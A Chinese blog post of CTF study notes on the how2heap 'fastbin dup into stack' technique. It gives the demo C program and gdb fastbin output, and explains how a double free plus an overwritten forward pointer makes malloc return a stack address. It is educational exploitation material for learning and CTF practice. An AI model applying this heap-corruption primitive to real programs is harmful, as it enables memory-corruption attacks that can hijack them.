---
title: how2heap-03 fastbin dup into stack实践笔记
tags: [CTF, pwn, heap]
layout: post
categories: tutorials
---

> 本文是对shellphish的[how2heap](https://github.com/shellphish/how2heap)系列堆漏洞课程的实践笔记

## 示例源码

``` c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	printf("The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
  /* [1] */
	printf("Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	printf("1st malloc(8): %p\n", a);
	printf("2nd malloc(8): %p\n", b);
	printf("3rd malloc(8): %p\n", c);

	printf("Freeing the first one...\n");
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	printf("Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);

	unsigned long long *d = malloc(8);

	printf("1st malloc(8): %p\n", d);
	printf("2nd malloc(8): %p\n", malloc(8));
  /* [2] */
	printf("Now the free list has [ %p ].\n", a);
	printf("Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	printf("Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
  /* [3] */
	printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	printf("4th malloc(8): %p\n", malloc(8));
  /* [4] */
}
```

## 漏洞分析

这节是上节fastbin dup的扩展，目的是获得一个指向任意地址的指针，在这里我们是获得一个栈的指针

我们用gdb挂起程序，运行到`[1]`位置，此时我们定义了一个指针，指针的地址为`0x7fffffffdb68`，而我们希望`malloc()`返回的地址为`0x7fffffffdb70`

``` bash
The address we want malloc() to return is 0x7fffffffdb70.
```

继续向下，和`fastbin-dup`类似，因此具体过程不再描述，这里直接向下运行到`[2]`处

在`[2]`位置，程序新定义了一个指针`d`，指向新分配的内存地址，也就是chunk `a`的地址。往下，我们的目的是在栈中写入一个`伪造的free chunk的大小`，在这里我们是`stack_var`并设定为`0x20`

随后在`[3]`位置`*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));`，这意思是将point `d`指向`stack_var`的上一个位置

``` bash
gdb-peda$ freebins
fast bin 0 @ 0x602000
	free chunk @ 0x602000 - size 0x20
	free chunk @ 0x7fffffffdb60 - size 0x20
	free chunk @ 0x602010 - size 0x0
gdb-peda$ fastbins
fastbins
[ fb 0 ] 0x7ffff7dd3768  -> [ 0x602000 ] (32)
                            [ 0x7fffffffdb60 ] (32)
                            [ 0x602010 ] (32)
```

可以看见，实际上，通过修改了`fastbins`上的数据，伪造了一个新的`bin`，其中这个伪造`bin`的大小为`0x20`，地址为`0x7fffffffdb60`，也就是`*d = &stack_var - sizeof(d) = 0x7fffffffdb68 - 0x08 = 0x7fffffffdb60`,从而向`fastbins`添加了一个伪造的bin，即`[ 0x602000 ] -> [0x7fffffffdb60]`，这时再`malloc(8)`，那么申请两次，便可以获得一个栈上的地址，这个栈上的地址为`8+(char *)&stack_var`，即`[0x7fffffffdb70]`

即得到结论

> 通过fastbins的2free并覆盖fastbins结构，我们可以获得一个指向任意地址(比如栈)的指针

![fastbin_dup_into_stack](http://od7mpc53s.bkt.clouddn.com/how2heap-fastbin_dup_into_stack.png)
